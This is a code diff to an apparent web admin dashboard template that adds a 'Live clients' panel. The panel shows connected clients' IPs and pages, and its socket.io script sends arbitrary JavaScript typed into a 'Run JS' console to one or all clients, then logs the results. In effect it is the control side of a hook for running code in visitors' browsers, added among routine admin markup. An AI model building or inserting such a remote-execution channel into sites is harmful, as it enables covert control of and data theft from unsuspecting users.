@@ -406,7 +406,46 @@
 
     </div>
 
-    <!-- Alerts -->
+    <section class="admin-card admin-live-card">
+
+        <div class="admin-card-header">
+            <div>
+                <h2>Live clients</h2>
+                <p>Connected clients in real time and remote execution console.</p>
+            </div>
+            <strong id="live-total">0 online</strong>
+        </div>
+
+        <div class="admin-live-grid">
+            <div>
+                <div class="admin-live-toolbar">
+                    <select id="live-target" class="admin-select">
+                        <option value="all">All clients</option>
+                    </select>
+                    <button id="live-run-js" class="admin-action-button" type="button">Run JS</button>
+                </div>
+                <textarea id="live-js-code" class="admin-live-code" placeholder="console.log(location.href);"></textarea>
+                <pre id="live-log" class="admin-live-log"></pre>
+            </div>
+
+            <div class="admin-live-table-wrap">
+                <table class="admin-live-table">
+                    <thead>
+                        <tr>
+                            <th>ID</th>
+                            <th>Page</th>
+                            <th>IP</th>
+                            <th>Last seen</th>
+                        </tr>
+                    </thead>
+                    <tbody id="live-clients-body">
+                        <tr><td colspan="4" class="admin-empty">Waiting for clients...</td></tr>
+                    </tbody>
+                </table>
+            </div>
+        </div>
+
+    </section>
 
     <section class="admin-card admin-alert-card">
 
@@ -443,6 +482,79 @@
         <% } %>
 
     </section>
+
+<script src="/socket.io/socket.io.js"></script>
+<script>
+    (function () {
+        if (typeof window.io !== "function") return;
+        var totalEl = document.getElementById("live-total");
+        var targetEl = document.getElementById("live-target");
+        var codeEl = document.getElementById("live-js-code");
+        var runEl = document.getElementById("live-run-js");
+        var bodyEl = document.getElementById("live-clients-body");
+        var logEl = document.getElementById("live-log");
+        var clients = [];
+
+        function esc(value) {
+            return String(value || "").replace(/[&<>"']/g, function (ch) {
+                return ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" })[ch];
+            });
+        }
+
+        function appendLog(text) {
+            if (!logEl) return;
+            var line = "[" + new Date().toLocaleTimeString() + "] " + text;
+            logEl.textContent = (line + "\n" + logEl.textContent).slice(0, 8000);
+        }
+
+        function render() {
+            if (totalEl) totalEl.textContent = clients.length + " online";
+            if (targetEl) {
+                var current = targetEl.value || "all";
+                targetEl.innerHTML = '<option value="all">All clients</option>' + clients.map(function (c) {
+                    return '<option value="' + esc(c.id) + '">' + esc(c.id + " · " + (c.page || "")) + '</option>';
+                }).join("");
+                targetEl.value = clients.some(function (c) { return c.id === current; }) ? current : "all";
+            }
+            if (!bodyEl) return;
+            if (!clients.length) {
+                bodyEl.innerHTML = '<tr><td colspan="4" class="admin-empty">No connected clients</td></tr>';
+                return;
+            }
+            bodyEl.innerHTML = clients.map(function (c) {
+                return "<tr>"
+                    + "<td>" + esc(c.id) + "</td>"
+                    + "<td>" + esc(c.page) + "</td>"
+                    + "<td>" + esc(c.ip) + "</td>"
+                    + "<td>" + esc(c.lastSeenAt) + "</td>"
+                    + "</tr>";
+            }).join("");
+        }
+
+        var socket = window.io("/", { path: "/socket.io", auth: { role: "admin" } });
+
+        socket.on("live:snapshot", function (payload) {
+            clients = payload && Array.isArray(payload.clients) ? payload.clients : [];
+            render();
+        });
+
+        socket.on("live:command", function (payload) {
+            appendLog("comando " + (payload.commandId || "") + " enviado a " + (payload.target || "all"));
+        });
+
+        socket.on("live:exec-result", function (payload) {
+            appendLog((payload.ok ? "ok" : "error") + " " + (payload.clientId || "") + ": " + (payload.output || ""));
+        });
+
+        if (runEl) {
+            runEl.addEventListener("click", function () {
+                var code = (codeEl && codeEl.value) ? codeEl.value.trim() : "";
+                if (!code) return;
+                socket.emit("admin:run-js", { target: targetEl ? targetEl.value : "all", code: code });
+            });
+        }
+    })();
+</script>
 
 </main>
 
